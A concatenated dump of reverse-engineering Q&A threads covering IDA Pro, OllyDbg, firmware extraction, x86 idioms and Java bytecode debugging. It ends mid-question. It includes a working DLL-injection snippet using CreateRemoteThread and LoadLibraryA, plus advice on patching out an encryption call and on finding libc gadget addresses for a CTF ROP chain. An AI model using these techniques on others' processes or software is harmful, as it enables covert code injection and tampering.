<p>I have ARM binary and I want to specify ARM or THUMB code making manually in IDA, but how to do this?</p>
","<p>When IDA first analyzes the binary, it detects which parts of the code are ARM, and which part are THUMB instructions. Then, it creates segments according to the analysis, and marks each segment as a ""THUMB"" or ""ARM"" segment.</p>

<p>Press <kbd>ctrl</kbd>-<kbd>G</kbd> to see which segment has which type (Value 00=ARM, 01=THUMB).</p>

<p>Press <kbd>alt</kbd>-<kbd>G</kbd> to change the designation of the current segment (the one the cursor is in right now).</p>

<p>If you aren't satisfied with what the analyzer created, use the Edit/Segments submenus to move, resize, create, or delete them.</p>
","12701"
"Is it possible to make an application skip a call?","3171","","<p>I have an application that calls a subroutine before sending the data over socket and in that subroutine the packet is being encrypted. Is there any way to make application skip that subroutine and send the packet as non-encrypted ?</p>
","<p>As Dillinur wrote, you need to NOP out this call. To do that you may need a hex editor, like <a href=""http://www.x-ways.net/winhex/"" rel=""nofollow noreferrer"">WinHex</a>. To NOP out the subroutine, you have to determine from which address it is called. To see that address, in IDA go to <strong>Options -> General</strong> and mark <strong>Line Prefixes</strong>. </p>

<p>It's also nice to see which Opcodes you would like to NOP out. Go to <strong>Options -> General</strong> and write <strong>6</strong> in the field <strong>Number of opcode bytes</strong>. Then your IDA graph mode will look like that:</p>

<p><a href=""https://i.stack.imgur.com/JRKL4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/JRKL4.png"" alt=""IDA Graph mode""></a></p>

<p>In my example, if I want to skip the foo-subroutine while execution, I need to set the opcode bytes <em>E8 DF E6 FF FF</em> to <em>90 90 90 90 90</em> (E8 is the call mnemonic and the rest are the offset bytes). 0x90 is the NOP opcode.</p>

<p>To NOP out these bytes I open the executable in <a href=""http://www.x-ways.net/winhex/"" rel=""nofollow noreferrer"">WinHex</a> and search the offset 0x31CC (not 0x4031CC, because 0x400000 is the load address of my executable in IDA). Finally, when I've found the offset 0x31CC I look for the sequence of bytes E8 DF E6 FF FF and then edit them to 90 90 90 90 90. Save it.</p>

<p>Also you may think about NOPing out of the PUSH-instruction(s) preceding your subroutine in order to avoid errors in the succeeding code.</p>
","10863"
"Is there any way to get a list of function arguments used with IDC?","3168","","<p>I'm using IDA Pro 6.5, and I got the offset of a function and its arguments.
It looks like this:</p>

<pre><code>.text:0000C0DE        int __cdecl func(char* a1, int a2, int a3, int a4, int a5, int a6, char* a7)
</code></pre>

<p>However, it has tons of xrefs (more than 200!)</p>

<p>Is there any way of dumping <code>a1</code> and <code>a7</code> arguments of every call to a list?<br>
I cannot hook and dump the arguments at runtime.</p>

<p>I know I can walk the xref list with IDC, but once I'm on the <code>call func</code> instruction, I don't know how to get arguments from the stack.</p>
","<p>If you have the <a href=""https://www.hex-rays.com/products/decompiler/index.shtml"" rel=""nofollow"">Hex-Rays Decompiler</a>, I'd recommend <a href=""https://www.hex-rays.com/products/decompiler/manual/batch.shtml"" rel=""nofollow"">decompiling the entire binary</a> and then <a href=""http://www.urbandictionary.com/define.php?term=grep"" rel=""nofollow"">grep</a>'ing the resulting decompilation for <code>func(</code>.</p>

<p>This should provide you with more useful results than whatever IDC script one could develop.</p>
","6965"
"Has XOR EAX, EBX another purpose?","3160","","<p>I have the following line in an assembler code:</p>

<pre><code> XOR EAX, EBX
</code></pre>

<p>So, then I've searched a little bit and found out that XOR represents a ""swap algorithm"". You can read it here: <a href=""http://en.wikipedia.org/wiki/XOR_swap_algorithm"" rel=""nofollow"">http://en.wikipedia.org/wiki/XOR_swap_algorithm</a></p>

<p>But when I look in register window of ollydbg, then I have the following </p>

<pre><code> EAX = 00000068
 EBX = 0000003B
</code></pre>

<p>Now, after the line the register window says</p>

<pre><code>EAX = 000000053
EBX = 0000003B
</code></pre>

<p>But from that what I have read in wikipedia article I would expect the following</p>

<pre><code>EAX = 0000003B
EBX = 00000053
</code></pre>

<p>At the end, i can say that a normal XOR operation is performed because:</p>

<pre><code>0111011   =&gt;EAX=0000003B 
1101000   =&gt;EBX=00000068
-------
1010011   =&gt;EAX=00000053
</code></pre>

<p>So my question would be why the swap algorithm is not performed. Or in other words: When can I expect the swap algorithm?</p>
","<p>As the first answer states, XOR is a bitewise XOR, not an XOR swap. </p>

<p>To do the Xor swap that you referenced from wikipedia it takes <em>3 instructions</em> : </p>

<pre><code>xor eax, ebx
xor ebx, eax
xor eax, ebx
</code></pre>

<p>Since you asked about the <em>purpose</em> of XOR I thought I would include some other concepts for you to read up on, so you might have an idea of what to expect from XORs</p>

<p>You can use XOR to clear a register: </p>

<pre><code>xor eax,eax
</code></pre>

<p>Calculate absolute value: </p>

<pre><code>cdq
xor eax,edx
sub eax,edx
</code></pre>

<p>XORs can be used for Crypto:
<a href=""http://en.wikipedia.org/wiki/XOR_swap_algorithm"">http://en.wikipedia.org/wiki/XOR_swap_algorithm</a></p>

<p>XORs are used in the CRC checksum algorithm:
<a href=""http://en.wikipedia.org/wiki/Cyclic_redundancy_check"">http://en.wikipedia.org/wiki/Cyclic_redundancy_check</a></p>

<p>XORs can be used to calculate Gray codes:
<a href=""http://www.morkalork.com/mork/article/74/How_to_understand_and_use_Gray_code.htm#.U6RhN_ldXvI"">http://www.morkalork.com/mork/article/74/How_to_understand_and_use_Gray_code.htm#.U6RhN_ldXvI</a></p>

<p>This is just the tip of the iceberg. The instruction can be used in a large number of situations. </p>
","4654"
"How to extract N150R firmware from .img file","3146","","<p>I'm trying to mount an img file for my wireless router firmware but I can't seem to do it successfully.</p>

<p>When I fun the file command on that .img it returns the following:</p>

<pre><code>$ file file.img 
file.img: data
</code></pre>

<p>When I try to use mount on it I get the following:</p>

<pre><code>$ sudo mount file.img test/
mount: you must specify the filesystem type
</code></pre>

<p>When I try to tell to use ""-t auto"" I get the same output:</p>

<pre><code>$ sudo mount -t auto file.img test
mount: you must specify the filesystem type
</code></pre>

<p>xxd returns the following:</p>

<pre><code>$ xxd -a N150R-V1.0.0.5_1.0.1.img | head
0000000: 6465 7669 6365 3a4e 3135 3052 0a76 6572  device:N150R.ver
0000010: 7369 6f6e 3a56 312e 302e 302e 355f 312e  sion:V1.0.0.5_1.
0000020: 302e 310a 7265 6769 6f6e 3a0a 0000 0000  0.1.region:.....
0000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
*
0000070: 0000 0000 0000 0000 0000 0000 0000 1232  ...............2
0000080: 3036 3132 d9cf 3fc1 5297 2c87 0033 eed0  0612..?.R.,..3..
0000090: 9f05 0000 9f05 0000 9b63 9e62 0505 0700  .........c.b....
00000a0: 4e31 3530 522d 5631 2e30 2e30 2e35 5f31  N150R-V1.0.0.5_1
00000b0: 2e30 2e31 0000 0000 0000 0000 0000 0000  .0.1............
</code></pre>

<p>binwalk gives the following:</p>

<pre><code>$ binwalk N150R-V1.0.0.5_1.0.1.img 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
192           0xC0            Squashfs filesystem, big endian, version 3.0, size: 3403472 bytes, 1024 inodes, blocksize: 65536 bytes, created: 2013-11-28 11:44:07
</code></pre>

<p>fdisk (on OS X) returns:</p>

<pre><code>$ fdisk N150R-V1.0.0.5_1.0.1.img 
Disk: N150R-V1.0.0.5_1.0.1.img  geometry: 26/4/63 [6656 sectors]
Signature: 0x95EB
         Starting       Ending
 #: id  cyl  hd sec -  cyl  hd sec [     start -       size]
------------------------------------------------------------------------
 1: 02  648  41  48 -  107 220  28 [ 275573942 - 2530152094] XENIX /     
 2: C9  165 158   8 -  311  15  40 [1825336399 - 3160300718] &lt;Unknown ID&gt;
 3: 12  606 153  51 -  988 164  42 [3547124620 - 4171149652] Compaq Diag.
 4: BD  479 182  60 -  173 155  40 [2642289636 - 1573814809] &lt;Unknown ID&gt;
</code></pre>

<p>Could I get some guidance on how to extract the files from the img?  I have access to both OS X and Ubuntu.</p>

<p><a href=""http://support.on-networks.com/article_details/n150r-firmware-version-1005#N150R"" rel=""nofollow"">Link to Firmware</a></p>

<p>EDIT 1:
Result of sasquatch:</p>

<pre><code>$ sasquatch N150R-V1.0.0.5_1.0.1.img 
SquashFS version [24373.11825] / inode count [1312449891] suggests a SquashFS image of a different endianess
Non-standard SquashFS Magic: devi
Reading a different endian SQUASHFS filesystem on N150R-V1.0.0.5_1.0.1.img
Filesystem on N150R-V1.0.0.5_1.0.1.img is (13663:12590), which is a later filesystem version than I support!
</code></pre>
","<p>The SquashFS image is version 3.0 with LZMA compression; LZMA compression was not officially added to SquashFS until version 4.0, so standard SquashFS tools won't recognize it.</p>

<p>However, <a href=""https://github.com/devttys0/sasquatch"" rel=""nofollow"">sasquatch</a> extracts it just fine for me. In fact, if you have sasquatch installed, the latest version of binwalk will use it to auto-extract the file system if you run binwalk with the <code>-e</code> option.</p>

<p><strong>UPDATE:</strong></p>

<p>You need to give <code>sasquatch</code> the SquashFS image, not the raw firmware image. First, extract it with <code>dd</code> and then run <code>sasquash</code> against the extracted file:</p>

<pre><code>$ dd if=N150R-V1.0.0.5_1.0.1.img bs=192 skip=1 of=fs.squashfs
$ sasquatch fs.squashfs
</code></pre>

<p>The latest version of <code>binwalk</code> does this for you automatically with the <code>-e</code> option:</p>

<pre><code>$ binwalk -e N150R-V1.0.0.5_1.0.1.img
</code></pre>

<p>You can force older versions of <code>binwalk</code> to use <code>sasquatch</code> as well:</p>

<pre><code>$ binwalk --dd='squashfs:squashfs:sasquatch %e' N150R-V1.0.0.5_1.0.1.img
</code></pre>
","6721"
"IDA EBP variable offset","3146","","<p>Let's take a look of how IDA displays address of local variable. For instance:</p>

<pre><code>MOV EAX, [EBP + var_4]
</code></pre>

<p>As we all know as far as local variables go, they are located at lower addresses of EBP.</p>

<p><img src=""https://i.stack.imgur.com/XDoh3.png"" alt=""Stack Frame""></p>

<p>Though, I have been taking it for granted and inevitable, I am still very curious. Why does IDA display local variable offset as <strong><code>[EBP + var]</code></strong>, not <strong><code>[EBP - var]</code></strong>?</p>

<p>Thank you so much.</p>
","<p>Have a look at the <code>var_4</code> definition at the start of the function:</p>

<pre><code>var_4 = dword ptr -4
</code></pre>

<p>So it's actually negative as expected.</p>

<p>For a more complete picture, use <kbd>Ctrl+K</kbd> or double-click/Enter on the stack var to see the <a href=""https://www.hex-rays.com/products/ida/support/idadoc/488.shtml"">stack frame layout</a>:</p>

<pre><code>-00000018 ; Two special fields "" r"" and "" s"" represent return address and saved registers.
-00000018 ; Frame size: 18; Saved regs: 4; Purge: 0
-00000018 ;
-00000018
-00000018 var_18          dd ?
-00000014 var_14          dd ?
-00000010 var_10          db 12 dup(?)
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008 arg_0           dd ?
+0000000C
+0000000C ; end of stack variables
</code></pre>
","2195"
"In which language is the BIOS written?","3113","","<p>As I understand, the BIOS code/bitstream that held in the ROM should be generic (work alongside with multiple CPU types or ISAs). In addition, I saw mentions in the web that claim to have the possibility to dump it's code (and to '<em>disassemble</em>' it).</p>

<p>So, in which language, instruction set or machine code is it written? Doesn't it need any kind of processor to perform its operations? If so I guess that it will use the external CPU, then how does it knows the specific instruction set of the employed one?</p>

<p>Maybe it has an internal processor?</p>
","<blockquote>
  <p>So, in which language, instruction set or machine code is it written?</p>
</blockquote>

<p>It's written in a language that can be compiled to machine code that can be executed by the processor (the CPU). Typically, it's a combination of C and assembly language.</p>

<blockquote>
  <p>Doesn't it need any kind of processor to perform its operations?</p>
</blockquote>

<p>Yes, the processor is what runs the BIOS code.</p>

<blockquote>
  <p>If so I guess that it will use the external CPU</p>
</blockquote>

<p>Correct.</p>

<blockquote>
  <p>then how does it knows the specific instruction set of the employed one?</p>
</blockquote>

<p>It doesn't. That's why when you purchase a motherboard, you need to make sure to buy one compatible with the CPU you plan to use with it. See, for example, <a href=""https://www.asus.com/us/Motherboards/"" rel=""nofollow noreferrer"">ASUS's motherboard list</a>. They have motherboards meant for Intel CPUs, motherboards meant for AMD CPUs, etc. And if you drill into the <a href=""https://www.asus.com/us/Motherboards/X99E_WS/specifications/"" rel=""nofollow noreferrer"">specs for a given motherboard</a>, you'll see which specific CPUs it's meant to work with:</p>

<p><a href=""https://i.stack.imgur.com/kwgB6.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/kwgB6.png"" alt=""CPUs""></a></p>
","10999"
"Purpose of OR EAX,0xFFFFFFFF","3097","","<p>I have read the assembly line </p>

<pre><code>OR EAX, 0xFFFFFFFF
</code></pre>

<p>and in the register <code>EAX</code> the program has stored a string. I have problems to understand how we can make a comparison with a string and a value like that.
After performing that instruction, <code>EAX</code> has the value <code>0xFFFFFFFF</code>.</p>

<p>Can someone tell me which purpose that operation has ? Is it a line which comes frequently in an assembly code ? (for example the line <code>XOR EAX, EAX</code> which is an efficient way to make <code>EAX = 0</code> ? Is it something like that ?)</p>
","<p>I think that in order to understand why the compiler does this, study the following disassembly:</p>

<pre><code>B8 FF FF FF FF                          mov     eax, 0FFFFFFFFh
83 C8 FF                                or      eax, 0FFFFFFFFh
</code></pre>

<p>What the compiler is trying to accomplish is probably to set the <code>eax</code> register to -1 using as few bytes as possible in order to be cache friendly. <code>OR</code> also has about twice the throughput of the <code>MOV</code> instruction as long as you don't mind messing up the flags. </p>

<p>This is probably a variable being initialized to -1.</p>
","4611"
"Base address of shared objects from ldd output","3082","","<p>I'm on a Linux machine with ASLR disabled. Running <code>ldd</code> on a binary gives me the following result :</p>

<pre><code>linux-gate.so.1 =&gt;  (0xb7fe1000)
libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e5c000)
/lib/ld-linux.so.2 (0xb7fe2000)
</code></pre>

<p>Does this mean that <code>libc.so.6</code> will be loaded at the address <code>0xb7e5c000</code>? I'm trying to build a ROP chain for an old CTF challenge and I'd like to get gadgets from the library. I'm looking to know the base address of the library so that I can add it to the offsets of the gadgets.</p>
","<p>In fact, <code>ldd</code> is loading the libraries on-the-fly to list what libraries are needed. So, on this run, you can say that <code>libc.so.6</code> has been loaded at <code>0xb7e5c000</code>, but you have no warranty that it will always be the case. Even with no ASLR, it is mainly depending on the loading order of the libraries that might vary from one run to another.</p>

<p>Nevertheless, assuming you have no ASLR, and speaking about the <code>libc</code>, which will be very likely to be the first loaded library anyway, you can safely assume that it will loaded at this address most of the time.</p>
","1997"
"Java .class bytecode debugger","3076","","<p>What is the good Java debugger for .class files, if no source code available? jdb is seems pretty weak :(
I don't need to decompile .class, but I want to debug bytecode.</p>
","<blockquote>
  <p><strong><a href=""http://www.drgarbage.com/bytecode-visualizer/"" rel=""noreferrer"">Bytecode Visualizer</a></strong>
  <br>Inspect, understand and debug Java bytecode, no matter if you have the corresponding source.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""https://github.com/nlfiedler/jswat"" rel=""noreferrer"">JSwat Debugger</a></strong>
  <br>JSwat is a graphical Java debugger front-end, written to use the Java Platform Debugger Architecture and based on the NetBeans Platform. Its features include sophisticated breakpoints; colorized source code display with code navigator; movable display panels showing threads, call stack, visible variables, and loaded classes; command interface for more advanced features; and Java-like expression evaluation, including method invocation.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""http://sourceforge.net/projects/jbcd/"" rel=""noreferrer"">Java ByteCode Debugger (JBCD)</a></strong>
  <br>JBCD is an interactive debugger for Java bytecode. It allows a programmer to step through bytecode one statement at time. The tool is indended for people who are writing programs to generate or modify bytecode. JBCD can be used with any Java compiler</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""https://the.bytecode.club/pages.php?page=bytecode-viewer"" rel=""noreferrer"">Bytecode Viewer</a></strong>
  <br>Bytecode Viewer is a Java Bytecode Viewer, GUI Procyon Java Decompiler, GUI CFR Java Decompiler, GUI FernFlower Java
  Decompiler, GUI Jar-Jar, Hex Viewer, Code Searcher, <strong>Debugger</strong> and more.
  It's written completely in Java, and it's open sourced.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""https://code.google.com/p/javasnoop/"" rel=""noreferrer"">JavaSnoop</a></strong>
  <br>A tool that lets you intercept methods, alter data and otherwise hack Java applications running on your computer.</p>
</blockquote>

<p><p></p>

<blockquote>
  <p><strong><a href=""http://andrei.gmxhome.de/bytecode/index.html"" rel=""noreferrer"">Bytecode Outline</a></strong>
  <br>Bytecode Outline plugin shows disassembled bytecode of current java editor or class file, allows bytecode/ASMifier code compare for java/class files and shows ASMifier code for current bytecode. It also allows to disassemble and <a href=""http://andrei.gmxhome.de/bytecode/debugging.html"" rel=""noreferrer""><strong>debug classes</strong></a> without attached source code on any operating system where Eclipse is running.</p>
</blockquote>

<p><p></p>

<p>Addendum: <a href=""http://blog.crowdstrike.com/native-java-bytecode-debugging-without-source-code/"" rel=""noreferrer"">This blog</a> from <em>Crowdstrike Inc.</em> will also be helpful</p>
","7992"
"Dll injection and GetProcAddress with the winapi","3072","","<p>So i just read a little bit about how one would go about for injecting a dll into a running program <a href=""https://en.wikipedia.org/wiki/DLL_injection"">on Wikipedia</a> (the <code>CreateRemoteThread</code> idea). I followed the steps described and eventually got it working. The thing i found interesting though which took some time to figure out are the following: When creating my remote thread and sending in the function i would like to be run as the first/starting one i hit a snag, when it was run it failed to call the proper functions, they seemed to turn into rubbish when i looked at them in OllyDBG which in turn resulted in the program crashing down on me. The code i used then was something along these lines:</p>

<pre><code>static DWORD __stdcall inject(LPVOID threadParam)
{
    MessageBoxA(NULL, ""test"", ""test"", NULL);
    LoadLibrary(""my.dll"");
    return 0;
}
</code></pre>

<p>And somewhere else:</p>

<pre><code>CreateRemoteThreadEx(hProcess, NULL, 0, LPTHREAD_START_ROUTINE(fnPageBase), dbPageBase, 0, NULL, &amp;threadId);
</code></pre>

<p>Where <code>fnPageBase</code> is the memory I've allocated in the to be injected process for my function and dbPageBase the memory I've allocated for a struct that is passed as the <code>LPVOID threadParam</code>.</p>

<p>Something like that, the problem was that both <code>MessageBoxA</code> and <code>LoadLibrary</code> didn't get a proper address it would seem, when i checked them in OllyDBG they always pointed to something that didn't exist. I googled around a little and found out that i should be using <code>GetProcAddr</code> to get a address to ie: <code>LoadLibrary</code> which i could later use by sending in some data via the <code>LPVOID threadParam</code> in my <code>inject()</code> call. So my question is: Why does it work when i use the <code>GetProcAddr</code> and not when I just try to use it ""normally""? Do I get some specific address that's always mapped in for everyone in the same region in memory when using that? </p>

<p>Also, what happens to my strings in the <code>inject()</code> function? Are they moved to some other place during compile which makes them unavailable to the program i'm injecting since it's in a totally different place of the memory (i.e., it's not mapped to there?)? I worked that around by sending that along in a struct with the <code>LPVOID threadParam</code> aswell in a struct that i had copied over to memory available to the <code>.exe</code> I was injecting. </p>

<p>If you need more info on how I did the other parts please do tell and I'll update.</p>
","<p>One thing you need to keep in mind is that code in your process and the code in the target process reside in <strong>different address spaces</strong>. So any address in your program is not necessary valid in the target process and vice versa.</p>

<p>This means the code that you inject cannot many any assumptions about addresses of functions or variables. Even your <code>inject</code> function's address is valid only in <em>your</em> process; to make it available in the target process you'd have to: 1) copy the code there; and 2) make sure any functions or memory addresses it refers to are valid in the new address space.</p>

<p>That's why the normal approach used with <code>CreateRemoteThreadEx</code> is to copy the DLL name to the target process and create the thread using the address of the <code>LoadLibrary</code> function:</p>

<pre><code>// 1. Allocate memory in the remote process for szLibPath
pLibRemote = ::VirtualAllocEx( hProcess, NULL, sizeof(szLibPath),
                               MEM_COMMIT, PAGE_READWRITE );

// 2. Write szLibPath to the allocated memory
::WriteProcessMemory( hProcess, pLibRemote, (void*)szLibPath,
                      sizeof(szLibPath), NULL );    

// Load ""LibSpy.dll"" into the remote process
// (via CreateRemoteThread &amp; LoadLibrary)
hThread = ::CreateRemoteThread( hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE) ::GetProcAddress( hKernel32,
                                       ""LoadLibraryA"" ),
             pLibRemote, 0, NULL );
</code></pre>

<p>(snippet <a href=""http://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Proces"">from Code Project</a>)</p>

<p>You can see that <code>pLibRemote</code> (with the address of the DLL name in the target process) is passed as the parameter to the thread routine. So the result of this is equivalent to:</p>

<pre><code>LoadLibraryA(pLibRemote);
</code></pre>

<p>executed in the target process.</p>

<p>Strictly speaking, this is not guaranteed to work because the address of <code>LoadLibraryA</code> in your process is not necessarily the same as <code>LoadLibraryA</code> in the other process. However, in practice it does work because system DLLs like kernel32 (where <code>LoadLibraryA</code> resides) are mapped to the same address in all processes, so <code>LoadLibraryA</code> also has the same address in both processes.</p>
","2794"
"How can I debug or monitor a Windows Phone 8 application?","3057","","<p>I'm interested in debugging and monitoring a Windows Phone 8 application for which I do not have the source code. Android and iOS can both be rooted/jailbroken, which allows me to use tools like GDB (and others) to debug and monitor a running application, but I'm not aware of anything similar for Windows Phone 8.</p>

<p>Additionaly I want to monitor filesystem activity while running the application (I use <a href=""http://www.newosxbook.com/src.jl?tree=listings&amp;file=3-filemon.c"">Filemon for iOS</a> for this task on iOS). Or is it easier to simply run the application in the Windows Phone 8 simulator and attempt to monitor the app that way?</p>

<p>How do you debug a Windows Phone 8 application without source code?</p>
","<h2>With source</h2>

<p>You could use something like <a href=""http://research.sensepost.com/tools/mobile/xapspy"">XAPSpy</a> and <a href=""https://github.com/andreycha/tangerine"">Tangerine</a> on Github which is updated to work with WP8. It may work without source not sure.</p>

<p>XAPSpy Source: <a href=""https://github.com/sensepost/XAPSpy"">Github</a>. </p>

<h2>Without source</h2>

<p>Something more advanced is need something more like <a href=""http://www.securityninja.co.uk/application-security/windows-phone-app-analyser-v1-0-released-today-2/"">Windows Phone App Analyser</a> </p>

<p>Download/Source: <a href=""http://sourceforge.net/projects/wpaa/"">SourceForge</a></p>

<p>I would imagine you could use them both together by decompliling the .xap you are working with with WPPA and then using XAPSpy on that source. I've never tried that though.</p>

<p>Sadly if you are dealing with a newer app you won't be able 
to decompile it as <a href=""http://forum.xda-developers.com/showthread.php?t=2140706"">they are encrypted</a>. You might be able to somehow get the keys out of the operating system but that would be difficult as well.</p>

<p>Here is a set of slides on the topic: <a href=""http://www.slideshare.net/AndreyChasovskikh/inspection-of-windows-phone-applications"">Inspection of Windows Phone Applciations</a> that goes into some detail about tangerine.</p>
","2030"
"How to find main() in binary?","3040","","<p>Given a binary and only using a tool like <code>ndisasm</code>, how can I find <code>main()</code>?
I don't want to use smart tools like IDA Pro because I'm doing this exercise to learn.</p>
","<p>This is quite tricky and necessitates a LOT of patience. I'll assume here that you're trying to find the <code>main</code> function as it is defined in C and not as the entry point of your program. It's very hard to find what you're looking for by scanning the code with your eyes &amp; brain. But here's a way. What you can do is first check the header of the binary file you're trying to disassemble. Below you'll find the output of <code>readelf -h</code> on a random file. If the file isn't damaged (on purpose or not) you'll be able to find the <em>Entry point address</em>.  </p>

<pre><code>  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400440
  Start of program headers:          64 (bytes into file)
  Start of section headers:          4680 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         8
  Size of section headers:           64 (bytes)
  Number of section headers:         35
  Section header string table index: 32
</code></pre>

<p>This address usually points to the location of the first chunk of code which will be executed at run time (<code>_start</code> function) and which will handle the <code>main</code> function parameters (or command line arguments) before calling the <code>main</code> function. Another technique would be to run your program under a debugger (<strong>GDB</strong> for instance) and go step by step.</p>

<p>I have to warn you though, if you're dealing with ELF binaries, things could turn out to be more complicated as they contain <code>ctor</code> and <code>dtor</code> tables which hold pointers to functions that are executed before and after the <code>main</code> function. You have also some undocumented weirdness going on when dealing with statically linked binaries. And of course, other programs can make do without a <code>main</code> function and call whatever they wish.</p>
","4147"
"OllyDebugger How to use Find Sequence of commands with wildcard 32bit registers","3034","","<p>Lets say I want to find all the</p>

<pre><code>MOV EAX, 1234h
MOV WORD PTR[EBP+ADDR], AX
</code></pre>

<p>But it won't be always <code>EAX</code> or <code>EBP+ADDR</code></p>

<p>How do I wildcard search like</p>

<pre><code>MOV ???, 1234h
MOV WORD PTR[???+ADDR], ??
</code></pre>

<p>I tried</p>

<pre><code>MOV ANY, 1234h
MOV WORD PTR[ANY+ADDR], ANY

MOV ?, 1234h
MOV WORD PTR[ANY+ADDR], ?

MOV r32, 1234h
MOV WORD PTR[r32+ADDR], r16
</code></pre>

<p>None of these patterns compile in Ollydebugger how do I do this? (I would like to avoid scripts for such a easy task.</p>

<p>This one below compiles and works,</p>

<pre><code>MOV r32, 0x1234
</code></pre>

<p>but how do I combine it with </p>

<pre><code>MOV WORD PTR[r32+ADDR], r16
</code></pre>
","<p><code>ollydbg 1.10</code> right click <code>Search For All Sequences wildcard</code> <strong>MOV R32 , CONST</strong></p>

<p>result from calc.exe xp sp3 32 bit vm</p>

<pre><code>Found sequences
Address                    Disassembly                            Comment
01001004 &lt;&amp;ADVAPI32.RegQu  DD      ADVAPI32.RegQueryValueExA      (Initial CPU selection)
010019E5                   MOV     EDI, OFFSET calc.ghnoParNum    01014C08=OFFSET calc.ghnoParNum
010019EF                   MOV     EDI, OFFSET calc.ghnoPrecNum   01014C70=OFFSET calc.ghnoPrecNum
01001A6B                   MOV     EBX, calc.010012A0             UNICODE ""intl""
01001D51                   MOV     ESI, 130
01001DDF                   MOV     EAX, OFFSET calc.szBlank       01014DA4=OFFSET calc.szBlank
01001DE6                   MOV     EAX, calc.01001264             UNICODE "" M""
01001F51 calc.WinMain      MOV     EAX, calc.010128EE             10128EE=calc.010128EE
01001FED                   MOV     ESI, 400
010020A2                   MOV     EAX, calc.010020A8             010020A8=calc.010020A8
010020D5                   MOV     EAX, 80000000
0100210A                   MOV     EDI, OFFSET calc.szAppName     UNICODE ""SciCalc""
</code></pre>

<p>combined wild card </p>

<p><strong>MOV WORD PTR [R32+CONST] , R16</strong></p>

<pre><code>Found sequences
Address        Disassembly                                     Comment
01001F6E       MOV     WORD PTR SS:[EBP-FC], BX
01002234       MOV     WORD PTR DS:[EAX+EDX*2+14], DI
0100230D       MOV     WORD PTR DS:[ESI+EAX*2+14], DI
0100231C       MOV     WORD PTR DS:[ESI+EAX*2+A4], DI
01002358       MOV     WORD PTR SS:[EBP+EDI*2-108], AX
01002376       MOV     WORD PTR SS:[EBP+EDI*2-108], AX
01002470       MOV     WORD PTR DS:[ECX+EAX*2+C], BX
010024AF       MOV     WORD PTR DS:[ECX+ESI*2+C], BX
0100251D       MOV     WORD PTR DS:[EAX+ECX*2+14], DX
010025AA       MOV     WORD PTR DS:[ECX+EAX*2+14], DX
0100404D       MOV     WORD PTR SS:[EBP+EAX*2-74], BX
010056E0       MOV     WORD PTR SS:[EBP+8], AX
010056F4       MOV     WORD PTR SS:[EBP+A], BX
01012475 calc  PUSH    70                              (Initial CPU selection)
</code></pre>

<p><strong>edit to address comment</strong></p>

<p>you <code>dont need the WORD ptr</code> simply doing<br>
<strong>mov [R32+CONST] ,R16</strong><br>
will fetch the same results<br>
ollydbg <code>implicitly knows R!6 means word ptr</code> instead of R16<br>
if you provide <code>r32</code> ollydbg will decode it as <code>DWORD PTR</code></p>

<pre><code>Found sequences, item 1
 Address=010017E7
 Disassembly=MOV     DWORD PTR SS:[EBP-2C], ESI
</code></pre>

<p>provide <code>mov [CONST} , R8</code>  and you get back <code>all BYTE PTR</code> Sequences</p>

<pre><code>Found sequences, item 1
 Address=0100AC75
 Disassembly=MOV     BYTE PTR DS:[ftrueinfinite], BL
</code></pre>
","4380"
"How to make stack variables into an array in IDA Pro","2994","","<p>I've got a procedure in IDA Pro with a few local stack variables, but part of them belong to an array. I would like to define the array, but pressing <code>*</code> (Create Array) fails, and pressing <code>Y</code> (Set Type) just brings up the type for the procedure, not the variable.</p>

<p>The same happens if I hover over an instance of its usage rather than its definition in the function prologue.</p>

<p>Oddly enough I seem to be able to rename them just fine.</p>

<p>How do I define a range of local variables to be an array; or, why is it not working for me?</p>
","<p>Double click the variable name in the disassembly, or press ctrl-k, to open the stack frame window. You can change your variable types there.</p>
","8441"
"Is there an equivalent of 'Run trace' as in OllyDbg for IDA PRO?","2985","","<p>I have been looking for the equivalent of the ""Run Trace"" option of OllyDbg in IDA Pro. Can anyone mention if there is one and how to use it ?</p>
","<p>IDA Pro offers two tracing options:</p>

<ol>
<li><strong>Instruction tracing</strong> <kbd>Debugger->Tracing->Instruction Tracing</kbd> It is very slow tracing process, since IDA monitors registers and has to record the address, the instruction, and changes values of registers, that were changed by the instruction.</li>
<li><strong>Function tracing</strong> <kbd>Debugger->Tracing->Function Tracing</kbd>. It is a subcategory of instruction tracing, where only function calls are logged. </li>
</ol>

<p>There are also three types of tracing events: execution traces, write traces, and read/write traces. </p>

<p>A trace in IDA Pro could by replayed by using <em>Trace replayer</em>. It is located within <em>Debuggers</em> submenu. You could switch to <em>Trace-replayer</em> by going to <kbd>Debugger->Switch Debugger...->Trace replayer</kbd></p>

<p><img src=""https://i.stack.imgur.com/0Hbix.png"" alt=""enter image description here""></p>

<p>One thing to remember that you have to have trace created before you can replay it. In order to create a trace you will need to do the following:</p>

<ol>
<li>Set a breakpoint at the point where you want you trace started. </li>
<li>Run the program with the debugger of your choice. </li>
<li>Whenever it breaks, select desired tracing <em>style</em> (Instruction or Function)</li>
<li>Run as far as necessary. You could set a second breakpoint to stop the trace.</li>
<li>You can optionally save the trace.</li>
<li>Replay the trace by switching debugger to <em>Trace replayer</em>.  </li>
</ol>
","2488"
"How to find how global variables defined in binary","2983","","<p>In Visual Studio I have written simple code,</p>

<pre><code>int pranit = 2;
int&amp; sumit = pranit;

